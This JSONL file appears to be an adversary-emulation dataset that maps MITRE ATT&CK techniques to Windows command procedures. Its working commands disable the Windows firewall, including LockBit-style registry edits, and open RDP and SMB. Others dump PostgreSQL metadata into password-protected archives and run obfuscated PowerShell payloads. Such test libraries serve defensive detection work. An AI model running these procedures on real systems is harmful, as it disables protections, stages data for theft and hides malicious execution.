{"Technique":"T1562.004","Behavior":"Summary: Open any inbound connection with netsh advfirewall. Description: Open any inbound connection with netsh advfirewall. Procedures: netsh advfirewall firewall add rule name=\"Allow Health-checking Inbound from Domain Controller\" dir=in action=allow protocol=TCP localport=any.","Tactics":["TA0005"]}
{"Technique":"T1562.004","Behavior":"Summary: Open any outbound connection with netsh advfirewall. Description: Open any outbound connection with netsh advfirewall. Procedures: netsh advfirewall firewall add rule name=\"Allow EDR agents outbound\" dir=out action=allow protocol=TCP localport=any.","Tactics":["TA0005"]}
{"Technique":"T1562.004","Behavior":"Summary: Open a local port defined by input arguments to any profile using netsh advfirewall. Description: Allow a specific anomaly inbound connection with netsh. Procedures: netsh advfirewall firewall add rule name=\"Open Port to Any\" dir=in protocol=tcp localport=3389 action=allow profile=any.","Tactics":["TA0005"]}
{"Technique":"T1562.004","Behavior":"Summary: Using registy key to add a firewall rule to allow RDP connection. Procedures: $guid = '980e5ec9-4db9-4441-8b8e-cd2b893072b9'; $rule = 'v2.29|Action=Allow|Active=TRUE|Dir=In|Protocol=6|LPort=3389|Name=Open Port 3389'; New-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\FirewallRules' -Name $guid -PropertyType String -Value $rule -Force | Out-Null.","Tactics":["TA0005"]}
{"Technique":"T1562.004","Behavior":"Summary: Set a firewall rule using New-NetFirewallRule. Procedures: New-NetFirewallRule -DisplayName \"VESCollector Inbound Connection\" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 3389.","Tactics":["TA0005"]}
{"Technique":"T1562.004","Behavior":"Summary: Edit a firewall rule (Remote Desktop) allow IPs from attacker. Procedures: Set-NetFirewallRule -DisplayName \"Remote Desktop - User Mode (UDP-In)\" -RemoteAddress 192.168.10.0/24.","Tactics":["TA0005"]}
{"Technique":"T1562.004","Behavior":"Summary: Disable Microsoft Defender Firewall via Registry. Description: Disables the Microsoft Defender Firewall for the public profile via registry. Caution if you access remotely the host where the test runs! Especially with the cleanup command which will re-enable firewall for the current profile.... Procedures: reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\PublicProfile\" /v \"EnableFirewall\" /t REG_DWORD /d 0 /f.","Tactics":["TA0005"]}
{"Technique":"T1562.004","Behavior":"Summary: LockBit Black - Unusual Windows firewall registry modification -cmd. Description: An adversary tries to modify the windows firewall registry. Procedures: reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile\" /v EnableFirewall /t REG_DWORD /d 0 /f && reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\StandardProfile\" /v EnableFirewall /t REG_DWORD /d 0 /f.","Tactics":["TA0005"]}
{"Technique":"T1562.004","Behavior":"Summary: LockBit Black - Unusual Windows firewall registry modification -Powershell. Description: An adversary tries to modify the windows firewall registry.. Procedures: New-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile\" -Name EnableFirewall -PropertyType DWORD -Value 0 -Force; New-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\StandardProfile\" -Name EnableFirewall -PropertyType DWORD -Value 0 -Force.","Tactics":["TA0005"]}
{"Technique":"T1562.004","Behavior":"Summary: Allow Executable Through Firewall Located in Non-Standard Location using netsh advfirewall. Description: This test will attempt to allow an executable through the system firewall located in the Users directory. Procedures: Copy-Item \"f7ce09_AtomicTest.exe\" -Destination \"C:\\Users\\$env:UserName\" -Force; netsh advfirewall firewall add rule name=\"Atomic Test\" dir=in action=allow program=\"C:\\Users\\$env:UserName\\AtomicTest.exe\" enable=yes.","Tactics":["TA0005"]}
{"Technique":"T1562.004","Behavior":"Summary: Allow SMB and RDP on Microsoft Defender Firewall (advfirewall set rule group). Procedures: netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes && netsh advfirewall firewall set rule group=\"file and printer sharing\" new enable=Yes.","Tactics":["TA0005"]}
{"Technique":"T1562.004","Behavior":"Summary: Disable Microsoft Defender Firewall using netsh advfirewall set currentprofile state. Procedures: netsh advfirewall set currentprofile state off.","Tactics":["TA0005"]}
{"Technique":"T1562.004","Behavior":"Summary: Disable Windows Firewall using netsh firewall set opmode. Procedures: netsh firewall set opmode mode=disable.","Tactics":["TA0005"]}
{"Technique":"T1074.001","Behavior":"Summary: Query db and dump data into files. Procedures: & 'C:\\Program Files\\PostgreSQL\\13\\bin\\psql.exe' -U postgres -d postgres -c \"\\du\" | Out-File C:\\Users\\Public\\result.txt -Append -Encoding utf8; & 'C:\\Program Files\\PostgreSQL\\13\\bin\\psql.exe' -U postgres -d postgres -c \"\\l\" | Out-File C:\\Users\\Public\\result.txt -Append -Encoding utf8; & 'C:\\Program Files\\PostgreSQL\\13\\bin\\psql.exe' -U postgres -d postgres -c \"\\conninfo\" | Out-File C:\\Users\\Public\\result.txt -Append -Encoding utf8.","Tactics":["TA0009"]}
{"Technique":"T1560.001","Behavior":"Summary: Compress db files with winrar.exe (using cli). Procedures: & 'C:\\Program Files\\WinRAR\\WinRAR.exe' a -afzip C:\\Users\\Public\\archive.zip C:\\Users\\Public\\result.txt -p'123qweA@'.","Tactics":["TA0009"]}
{"Technique":"T1560.001","Behavior":"Summary: Compress db files with 7z.exe (using cli). Procedures: & '#{7z.exe}' a C:\\Users\\Public\\archive.7z C:\\Users\\Public\\result.txt.","Tactics":["TA0009"]}
{"Technique":"T1027.010","Behavior":"Summary: Execute b64-encoded command through a program. Procedures: hi_world.exe -executor base64 execute.","Tactics":["TA0005"]}
{"Technique":"T1027.010","Behavior":"Summary: Execute b64-encoded .ps1 script through psh. Procedures: $B64=(Get-Content 'C:\\Users\\Public\\doc.txt' -Raw); [ScriptBlock]::Create([Text.Encoding]::UTF8.GetString((New-Object System.Security.Cryptography.FromBase64Transform).TransformFinalBlock([Text.Encoding]::ASCII.GetBytes($B64),0,$B64.Length))).Invoke().","Tactics":["TA0005"]}
{"Technique":"T1027.010","Behavior":"Summary: Execute obfuscated command/script (using psh directly) - SecureString (AES). Description: Invoke-Obfuscation, read more: https://iritt.medium.com/an-easy-guide-to-obfuscating-powershell-scripts-with-invoke-obfuscation-6fa3c8626ed3. Procedures: &((gv '*MdR*').nAME[3,11,2]-JOiN'')(([runTImE.iNtERopSeRViCES.mArShal]::ptrtOstrINgBStR( [rUNtimE.InTErOPServIcEs.MarshaL]::SECuREStRIngtoBSTr($('76492d1116743f0423413b16050a5345MgB8AEsASQBOADUAOQA4AEYAMQBDAFQAYQBnAHoAOABZAE0AdAArAGsAeQBSAFEAPQA9AHwAOQA0ADIANwAwAGIANwA0ADIAOAA2ADcAYwA1ADIANQA3ADIAZgAyADkAYQBmADAAMABmADUANAA3ADQAMQA0ADcAMwA4ADUAYgBkAGQAOAAwADkANwBiAGQAMQBjADcAZgA0AGIAYwA2AGYAMwA4ADIAMQBmAGEAMwAxADQAMwA5ADIAYgBkAGIANAA1ADgAZQA2AGQANQA3ADQAMAAwADMAOQAzADgAYgA1ADUAMwBhAGMAMwA4AGIAYQBkADgANQA0AGIANgBiAGIAYwBmADgAMAAzADQAOABlADEAOQA3ADIAOQBmADQAZgA0ADUAYwA5AGMANQA2ADUAMgAyAGYAOQAxADIAYQA5AGMANQA3ADcAYwBmADQAMwAzADgAZAA4ADEAZgA3AGUAYwBhADEANwBhADUAYgA2AGQANgA='| cONvertto-seCuRESTrING -keY (249..234)) )) )).","Tactics":["TA0005"]}
{"Technique":"T1027.010","Behavior":"Summary: Execute obfuscated command/script (using psh directly) - Hex. Description: Invoke-Obfuscation, read more: https://iritt.medium.com/an-easy-guide-to-obfuscating-powershell-scripts-with-invoke-obfuscation-6fa3c8626ed3. Procedures: . ( $VERBosEprEfERencE.TostriNg()[1,3]+'x'-Join'')([sTRing]::JoiN( '',('26h28h28r67Q76S20S27h2aZ4dh64Q52r2aN27Z29;2e;6eh41Z4dQ45h5bQ33Q2cr31h31;2c;32;5dN2dQ4a;4f;69S4e;27S27;29>28;28h5br72Q75>6eN54N49;6dN45N2eQ69Q4e;74>45h52;6fr70>53S65>52r56r69S43N45S53S2er6dh41Q72;53r68Q61Z6cN5d;3ah3a>70>74r72S74r4fh73N74S72>49Z4e;67>42h53Z74;52>28N20r5bQ72;55Z4e>74h69Q6dh45;2eS49S6eS54S45S72S4fN50Z53Q65h72N76Z49Q63Q45h73r2eQ4dS61>72N73>68r61h4cQ5d;3aZ3aQ53r45;43S75;52N45Q53N74;52S49S6eN67Q74h6f>42N53r54h72r28Q24S28;27N37>36>34Z39>32;64>31r31;31>36h37r34h33>66;30Z34N32>33S34N31r33Q62N31S36Z30r35S30>61>35Z33r34Z35h4dh67;42r38;41N45>73S41;53Q51;42r4fZ41r44r55N41S4fr51Z41h34h41S45h59N41Q4dZ51r42Q44N41r46;51h41Z59>51Z42N6eZ41h48Q6fr41;4fQ41>42Z5a;41r45r30N41r64>41>41;72r41>47Q73;41;65N51S42N53;41h46h45;41N50Q51r41Q39>41Q48h77N41;4fZ51h41r30N41;44N49Q41;4e>77>41h77;41>47Z49>41r4eQ77r41Z30;41N44Z49Q41N4fZ41r41r32h41N44h63S41N59r77;41S31>41h44;49N41Q4eS51Z41>33Q41Z44Q49h41N5aS67N41Z79r41Q44>6bh41N59>51>42Z6dQ41r44S41S41Q4d;41r42Q6dZ41N44S55N41r4eh41N41Q33S41h44h51>41h4dr51Q41r30r41N44Q63r41r4dS77N41N34>41r44N55>41N59;67r42N6bQ41;47S51r41;4fZ41>41S77r41S44r6bZ41Z4eh77Z42Q69N41r47>51N41S4d>51N42N6a>41h44r63Q41S5aQ67>41h30S41S47S49N41>59Z77;41S32Q41r47h59Q41>4dr77N41r34Z41r44N49>41Q4dN51N42N6dS41h47r45>41;4d;77h41r78r41;44N51Z41N4dQ77h41r35S41Q44>49h41Q59r67Z42;6br41S47;49>41;4eS41N41Q31>41>44Z67N41r5a>51;41;32;41>47S51;41>4eZ51Z41>33>41r44Q51Q41N4dN41r41>77S41N44r4d;41r4f>51>41h7ah41r44;67Z41Z59r67;41h31Q41>44>55h41>4d>77Q42;68>41N47>4d;41Z4dS77S41;34N41N47Q49h41Z59Z51Q42h6br41Q44>67h41S4eQ51>41h30N41Z47Q49N41Z4eQ67h42S69>41h47>49r41;59N77S42h6dQ41;44;67>41Q4d>41h41h7aQ41h44r51Q41h4fN41h42Z6cr41r44>45Q41N4fr51>41N33S41S44Q49N41Q4fN51;42S6dQ41>44r51r41Q5ar67N41h30h41Q44S55Z41Z59Z77>41h35N41S47S4d>41Q4eZ51S41S32;41Z44h55h41>4dS67N41r79Z41>47N59>41;4fZ51r41;78>41>44N49N41N59>51Z41Q35Q41>47;4dZ41;4e>51Q41Q33Z41Z44h63h41N59;77h42S6dh41Z44N51S41N4d;77>41N7aQ41;44h67r41S5a;41h41S34N41h44Q45S41Z5ar67Z41S33N41h47Z55h41N59S77Z42;68Z41Z44>45Z41>4e>77Q42>68S41S44Q55r41N59h67;41S32>41N47>51Q41N4eh67S41Q3d;27r7ch20Q63>4f;4e;76Q65;72N74Q74S6fS2dZ73S65>43r75S52S45r53;54>72N49h4e>47r20h2d;6bQ65S59;20Z28N32N34>39N2eh2eN32>33;34h29S29r20>29Q29;20Z29h29h20'-sPliT 'h'-spLiT'r' -SpliT'S' -spLiT 'Z' -spLiT'Q' -SpliT ';' -split'>'-splIt 'N'| % { ([convERT]::tOint16( ( $_.tosTrInG()), 16)-AS [char]) } ) ) ).","Tactics":["TA0005"]}